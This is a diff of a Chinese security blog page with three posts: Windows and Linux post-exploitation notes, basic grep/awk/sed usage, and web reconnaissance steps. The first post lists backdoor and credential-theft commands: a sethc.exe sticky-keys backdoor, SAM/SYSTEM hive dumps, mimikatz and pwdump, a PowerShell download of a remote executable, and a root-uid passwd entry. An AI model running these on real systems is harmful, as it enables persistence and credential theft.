+<p>可以完全隐藏—&gt;改注册表—&gt;<a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/</a></p>
+</li>
+</ul>
+<ul>
+<li><p>2.启用来宾账户并添加为管理员</p>
+<p><code>注：从windows2008开始有来宾账户 </code></p>
+</li>
+</ul>
+<ul>
+<li><p>3.shift后门 —用<code>c:\windows\cmd.exe</code>替换：<code>c:\windows\system32\sethc.exe</code><br> 然后在登录界面就可以用粘滞键启动cmd了</p>
+</li>
+<li><p>4.启动项、计划任务(不推荐)</p>
+</li>
+<li><p>5.DLL劫持</p>
+</li>
+<li><p>6.powershell后门</p>
+</li>
+<li><p>7.远控软件</p>
+</li>
+<li><p>8.获取现有账号的密码(推荐)</p>
+</li>
+</ul>
+<p>windows获取管理员密码：</p>
+<pre><code>获取密码： 
+wce.exe
+QuarksPwDump.exe
+Pwdump7.exe
+    x64.exe &quot;Pwdump7.exe&quot;
+    获取到hash值去somd5破解(或者彩虹表)
+gethash.exe
+mimikatz
+cain:登陆目标机器导出注册表成文件，然后用cain加载获取hash
+    reg save hklm\sam C:\hash\sam.hive
+    reg save hklm\system C:\hash\system.hive
+    reg save hklm\security C:\hash\security.hive
+    优点：免杀
+powershell脚本获取密码：
+    $client = new-object System.Net.WebClient;
+    $client.DownloadFile(&#39;http://*.*.*.*/a.exe&#39;,&#39;D:\GetPassword.exe&#39;);</code></pre>
+<p>注：关闭windows系统保护的方法</p>
+<p><code>takeown /f c:\windows\system32\*.*   /a /r /d y </code><br>    <code>cacls  c:\windows\system32\*.*  /T /E /G administrators:F</code></p>
+<h2 id="二。linux留后门-获取root密码："><a href="#二。linux留后门-获取root密码：" class="headerlink" title="二。linux留后门+获取root密码："></a>二。linux留后门+获取root密码：</h2><pre><code>获取密码：读/etc/shadow文件破解
+加ssh公钥
+加用户
+计划任务
+参考脏牛(修改passwd文件添加&quot;user:password:0:0&quot;)</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/03/03/%E6%8F%90%E6%9D%83/" data-id="ckgg5oe10001gzov207pn9xtz" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91-%E6%8F%90%E6%9D%83/" rel="tag">内网/提权</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-grep-find-awk-sed指令基础" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/03/grep-find-awk-sed%E6%8C%87%E4%BB%A4%E5%9F%BA%E7%A1%80/" class="article-date">
+  <time datetime="2019-03-03T06:24:29.000Z" itemprop="datePublished">2019-03-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/03/grep-find-awk-sed%E6%8C%87%E4%BB%A4%E5%9F%BA%E7%A1%80/">grep.find.awk.sed指令基础</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="grep和find指定-匹配字符和文件名"><a href="#grep和find指定-匹配字符和文件名" class="headerlink" title="grep和find指定(匹配字符和文件名)"></a>grep和find指定(匹配字符和文件名)</h1><ul>
+<li>grep ‘字符串’ 源文件，例如grep ‘代码执行’  第*  —从包含“第”的文件中查找包含代码执行的字符串</li>
+<li>grep –color ‘字符串’ 文件名—匹配到的字符串高亮</li>
+<li>find 目录 -name ‘字符串’，举例：find ./ -name ‘第*’  —查找名字包含“第”的文件</li>
+</ul>
+<p>源文件都支持通配符匹配</p>
+<h1 id="awk指令-匹配列"><a href="#awk指令-匹配列" class="headerlink" title="awk指令(匹配列)"></a>awk指令(匹配列)</h1><p>解释：</p>
+<ul>
+<li>awk 动作 文件名</li>
+<li>awk -F ‘:’—用-f指定字段分隔符为：冒号</li>
+<li>$NF表示最后一个字段，</li>
+<li>$(NF-1)表示倒数第二个字段,举例：awk -F ‘:’ ‘{print $1, $(NF-1)}’ demo.txt    —输出每行的第一和倒数第二个字段</li>
+<li>$NR表示当前处理的行(可以给行加上行号),举例：$ awk -F ‘:’ ‘{print NR “) “ $1}’ demo.txt</li>
+<li>$ awk ‘{print $0}’ demo.txt —把每行原样输出</li>
+<li>tolower()：字符转为小写。</li>
+<li>length()：返回字符串长度。</li>
+<li>substr()：返回子字符串。</li>
+<li>sin()：正弦。</li>
+<li>cos()：余弦。</li>
+<li>sqrt()：平方根。</li>
+<li>rand()：随机数。</li>
+</ul>
+<p>实例：</p>
+<h2 id="格式：awk-‘条件-动作’-文件名"><a href="#格式：awk-‘条件-动作’-文件名" class="headerlink" title="###  格式：awk ‘条件 动作’  文件名"></a>###  格式：awk ‘条件 动作’  文件名</h2><p> <code>awk -F &#39;:&#39; &#39;&#123; print toupper($1) &#125;&#39; demo.txt</code></p>
+<p><code> awk -F &#39;:&#39; &#39;/usr/ &#123;print $1&#125;&#39; demo.txt</code>    —输出包含usr的每行第一个字段</p>
+<p><code>awk -F &quot; &quot;&#39;&#123;print $9&#125;&#39;a.txt &gt;list.txt</code>    —把a.txt中被空格分隔的第九列内容重定向输出到list.txt中</p>
+<p><code>awk &#39;BEGIN&#123;a=&quot;100testa&quot;;if(a ~ /^100*/)&#123;print &quot;ok&quot;;&#125;&#125;&#39;</code>    —ok 正则匹配加判断</p>
+<p><code>awk &#39;BEGIN&#123;a=11;if(a &gt;= 9)&#123;print &quot;ok&quot;;&#125;&#125;&#39;</code>    —ok    加if判断</p>
+<p><code> awk -F &#39;:&#39; &#39;NR % 2 == 1 &#123;print $1&#125;&#39; demo.txt</code>    —输出奇数行</p>
+<p><code>awk -F &#39;:&#39; &#39;$1 == &quot;root&quot; || $1 == &quot;bin&quot; &#123;print $1&#125;&#39; demo.txt</code>    —输出第一字段等于root||bin行的第一个字段</p>
+<p><code>awk -F &#39;:&#39; &#39;&#123;if ($1 &gt; &quot;m&quot;) print $1; else print &quot;---&quot;&#125;&#39; demo.txt</code>    —如果字段1大于m就输出它，否则输出—</p>
+<h1 id="sed指令-匹配行"><a href="#sed指令-匹配行" class="headerlink" title="sed指令(匹配行)"></a>sed指令(匹配行)</h1><p>a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～</p>
+<p>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！</p>
+<p>d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；</p>
+<p>i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；</p>
+<p>p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～</p>
+<p>s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是啦！</p>
+<p>实例：</p>
+<p>​    <code>nl /etc/passwd | sed &#39;/root/&#39;  </code>—搜索/etc/passwd 有root关键字的行</p>
+<p>​    <code>sed &#39;s/^/#/g&#39; pets.txt  </code>—每行开头加个#号</p>
+<p>​    <code>nl /etc/passwd | sed &#39;2,5c No 2-5 number&#39; </code> —将第2-5行的内容取代成为No 2-5 number</p>
+<p>​    <code>nl /etc/passwd|sed -n &#39;/root/p&#39;</code>   —n表示只输出包含模板的行</p>
+<p>​    sed ‘s/要被取代的字串/新的字串/g’</p>
+<p>​    <code>nl /etc/passwd | sed -n &#39;/root/&#123;s/bash/blueshell/;p;q&#125;&#39; </code>   —搜索/etc/passwd,找到root对应的行，执行后面花括号中的一组命令，每个命令之间用分号分隔，这里把bash替换为blueshell，再输出这行</p>
+<p>​    <code>sed -i &#39;s/\.$/\!/g&#39; regular_express.txt  ---sed</code> 将 regular_express.txt 内每一行结尾若为 . 则换成 !</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/03/03/grep-find-awk-sed%E6%8C%87%E4%BB%A4%E5%9F%BA%E7%A1%80/" data-id="ckgg5oe0k000czov2970110lk" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux%E5%91%BD%E4%BB%A4%E4%B9%8B%E6%9F%A5%E6%89%BE/" rel="tag">linux命令之查找</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-信息搜集" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/02/24/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-date">
+  <time datetime="2019-02-24T00:17:54.000Z" itemprop="datePublished">2019-02-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/02/24/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">信息搜集</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>只要能挖掘到对黑客有用的信息,就是信息泄露</p>
+<h2 id="目标：只要能挖掘到对黑客有用的信息-就是信息泄露"><a href="#目标：只要能挖掘到对黑客有用的信息-就是信息泄露" class="headerlink" title="目标：只要能挖掘到对黑客有用的信息,就是信息泄露"></a>目标：只要能挖掘到对黑客有用的信息,就是信息泄露</h2><h3 id="需要搜集的信息-分类-web安全方向"><a href="#需要搜集的信息-分类-web安全方向" class="headerlink" title="*****需要搜集的信息:    分类(web安全方向)"></a><code>*****</code>需要搜集的信息:    分类(web安全方向)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.web服务器信息(中间件)</span><br><span class="line">2.web应用信息(web脚本,数据库类型,cms)</span><br><span class="line">3.服务器操作系统信息(系统版本)</span><br><span class="line">4.服务器其他信息(服务,端口)</span><br><span class="line">5.域名信息(子域名,ip)</span><br><span class="line">6.相关人员信息(注册域名相关人员)</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<hr>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="*****步骤:"></a><code>*****</code>步骤:</h3><h4 id="一-搜集域名-顶级域名-子域名"><a href="#一-搜集域名-顶级域名-子域名" class="headerlink" title="一.搜集域名(顶级域名,子域名)"></a>一.搜集域名(顶级域名,子域名)</h4><p><a target="_blank" rel="noopener" href="https://baidu.com/">https://baidu.com</a>          顶级子域名</p>
+<p><a target="_blank" rel="noopener" href="https://www.baidu.com/">https://www.baidu.com</a>       二级子域名<br>    <a target="_blank" rel="noopener" href="https://baike.baidu.com/">https://baike.baidu.com</a></p>
+<p><a target="_blank" rel="noopener" href="https://a.b.baidu.com/">https://a.b.baidu.com</a>       三级子域名    </p>
+<p>http:/asdasd.com.cn         顶级域名<br>    <a target="_blank" rel="noopener" href="http://beijing.gov.cn/">http://beijing.gov.cn</a>       顶级域名</p>
+<ul>
+<li>搜索方式:工具(layer,sublist3r,wydomain),谷歌(site:域名),网站(site.ip138.com)/(dnsdb.io),http证书,备案信息(icp.chinaz.com)</li>
+</ul>
+<blockquote>
+<p>技巧1:在tool.chinaz.com的备案号查看所有顶级域名</p>
+<p>技巧2.:域名+crossdomain.xml也可以查看其他子域名</p>
+<p>技巧3:利用同源策略,通过子域名绕过当前无法突破的域名</p>
+</blockquote>
+<h4 id="二-搜集相关注册人"><a href="#二-搜集相关注册人" class="headerlink" title="二.搜集相关注册人"></a>二.搜集相关注册人</h4><p>1.通过搜集网站seo.chinaz.com–&gt;</p>
+<p>2.通过浏览器插件portal查看***</p>
+<p>3.whois反查</p>
+<h4 id="三-搜集服务器信息"><a href="#三-搜集服务器信息" class="headerlink" title="三.搜集服务器信息"></a>三.搜集服务器信息</h4><p>1.判断操作系统</p>
+<p>–&gt;通过开放的端口和服务(后台一直扫着就可以,同时往下进行)<br>    windows:</p>
+<blockquote>
+<p>iis 80<br>        rpc 135<br>        smb 445<br>       rdp 3389</p>
+</blockquote>
+<p>linux:</p>
+<blockquote>
+<p>ssh 22<br>        NETBIOS 137 138 139</p>
+</blockquote>
+<ul>
+<li><p>通过大小写  <code>http://test.com/test.php</code></p>
+<pre><code>                `http://test.com/TEST.php`</code></pre>
+</li>
+<li><p>通过nmap -O ip查看系统信息</p>
+</li>
+</ul>
+<p>2.脚本语言</p>
+<ul>
+<li><p>识别伪静态</p>
+</li>
+<li><p>类似:<code>http://test.com/index/id/49</code></p>
+</li>
+</ul>
+<p>3.web中间件</p>
+<ul>
+<li><p>nmap -A选项</p>
+</li>
+<li><p>burp抓包查看response的server头</p>
+</li>
+</ul>
+<p>4.搜集cms信息</p>
+<p>(1).查看首页源代码<br>    (2).访问wp-login.php文件<br>    (3).discuz(论坛)平台特性:包含forum.php文件<br>    (4).robots.txt文件<br>    (5).网页底部的版权信息(copyright)</p>
+<p>工具-&gt;whatweb  (ruby写的)</p>
+<p>5.搜集服务器开放的端口及服务</p>
+<p>工具-&gt;：</p>
+<ul>
+<li><p>nmap</p>
+</li>
+<li><p>masscan</p>
+</li>
+<li><p>x-scan</p>
+</li>
+</ul>
+<hr>
+<hr>
+<h4 id="四-可能存在的信息泄露"><a href="#四-可能存在的信息泄露" class="headerlink" title="四.可能存在的信息泄露"></a>四.可能存在的信息泄露</h4><p>1.github信息泄露</p>
+<ul>
+<li><p>管理员的博客会包含一些自己网站的信     </p>
+</li>
+<li><p>如:运维脚本\源代码\配置文件</p>
+</li>
+</ul>
+<p>2.目录遍历</p>
+<ul>
+<li>如:127.0.0.1/admin/目录能正常打开</li>
+</ul>
+<p>3.任意文件下载</p>
+<ul>
+<li><p>针对有下载功能的页面,尝试下载重要文件</p>
+</li>
+<li><p>分系统—windows\linux           </p>
+</li>
+<li><p>分权限</p>
+</li>
+<li><p>分重要文件—passwd\shadow\history\</p>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/02/24/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckgg5oe0t000yzov2502wbb54" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/information-collect/" rel="tag">information collect</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker-api-php-registry/" rel="tag">docker-api,php,registry</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/information-collect/" rel="tag">information collect</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E5%91%BD%E4%BB%A4%E4%B9%8B%E6%9F%A5%E6%89%BE/" rel="tag">linux命令之查找</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python-%E6%89%AB%E6%8F%8F/" rel="tag">python 扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis%E6%BC%8F%E6%B4%9E-%E4%B8%80%E8%88%AC%E5%86%85%E7%BD%91%EF%BC%89/" rel="tag">redis漏洞(一般内网）</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell-%E8%84%9A%E6%9C%AC-Linux-search/" rel="tag">shell 脚本 Linux search</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell%E5%8F%8D%E5%BC%B9%E3%80%81powershell%E5%8F%8D%E5%BC%B9/" rel="tag">shell反弹、powershell反弹</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql-inject/" rel="tag">sql_inject</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/" rel="tag">sql注入流程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows-%E5%9F%9F-%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">windows 域 域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91-%E6%8F%90%E6%9D%83/" rel="tag">内网/提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91/" rel="tag">内网转发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BD%BF%E7%94%A8/" rel="tag">常用工具及使用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" rel="tag">文件包含漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BF%87waf/" rel="tag">过waf</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/docker-api-php-registry/" style="font-size: 10px;">docker-api,php,registry</a> <a href="/tags/information-collect/" style="font-size: 10px;">information collect</a> <a href="/tags/linux%E5%91%BD%E4%BB%A4%E4%B9%8B%E6%9F%A5%E6%89%BE/" style="font-size: 10px;">linux命令之查找</a> <a href="/tags/python-%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">python 扫描</a> <a href="/tags/redis%E6%BC%8F%E6%B4%9E-%E4%B8%80%E8%88%AC%E5%86%85%E7%BD%91%EF%BC%89/" style="font-size: 10px;">redis漏洞(一般内网）</a> <a href="/tags/shell-%E8%84%9A%E6%9C%AC-Linux-search/" style="font-size: 10px;">shell 脚本 Linux search</a> <a href="/tags/shell%E5%8F%8D%E5%BC%B9%E3%80%81powershell%E5%8F%8D%E5%BC%B9/" style="font-size: 10px;">shell反弹、powershell反弹</a> <a href="/tags/sql-inject/" style="font-size: 10px;">sql_inject</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/" style="font-size: 10px;">sql注入流程</a> <a href="/tags/windows-%E5%9F%9F-%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">windows 域 域渗透</a> <a href="/tags/%E5%86%85%E7%BD%91-%E6%8F%90%E6%9D%83/" style="font-size: 10px;">内网/提权</a> <a href="/tags/%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91/" style="font-size: 10px;">内网转发</a> <a href="/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">常用工具及使用</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">文件包含漏洞</a> <a href="/tags/%E8%BF%87waf/" style="font-size: 10px;">过waf</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/10/19/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/31/python%E6%89%B9%E9%87%8F%E7%88%AC%E5%8F%96URL%E9%85%8D%E5%90%88AWVS/">python批量爬取URL配合AWVS</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/24/first-shell/">first shell</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/24/docker-api/">php与docker-api与私有仓库</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/24/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
 </footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
 
-<!-- jQuery -->
-
-<script src="/js/jquery.min.js"></script>
-
-
-<!-- Bootstrap Core JavaScript -->
-
-<script src="/js/bootstrap.min.js"></script>
-
-
-<!-- Custom Theme JavaScript -->
-
-<script src="/js/blog.js"></script>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
 
 
-<!-- async load function -->
-<script>
-    function async(u, c) {
-      var d = document, t = 'script',
-          o = d.createElement(t),
-          s = d.getElementsByTagName(t)[0];
-      o.src = u;
-      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
-      s.parentNode.insertBefore(o, s);
-    }
-</script>
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
 
-<!-- jquery.tagcloud.js -->
-<script>
-    // only load tagcloud.js in tag.html
-    if($('#tag_cloud').length !== 0){
-        async("https://pengpengp.github.io/js/jquery.tagcloud.js",function(){
-            $.fn.tagcloud.defaults = {
-                //size: {start: 1, end: 1, unit: 'em'},
-                color: {start: '#bbbbee', end: '#0085a1'},
-            };
-            $('#tag_cloud a').tagcloud();
-        })
-    }
-</script>
-
-<!--fastClick.js -->
-<script>
-    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
-        var $nav = document.querySelector("nav");
-        if($nav) FastClick.attach($nav);
-    })
-</script>
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
 
 
 
-<!-- Google Analytics -->
+
+<script src="/js/script.js"></script>
 
 
 
-<!-- Baidu Tongji -->
 
-
-<!-- swiftype -->
-<script type="text/javascript">
-  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
-  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
-  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
-  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
-
-  _st('install','','2.0.0');
-</script>
-
-<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-<!--wechat title img-->
-<img class="wechat-title-img" src="">
+  </div>
 </body>
-
 </html>
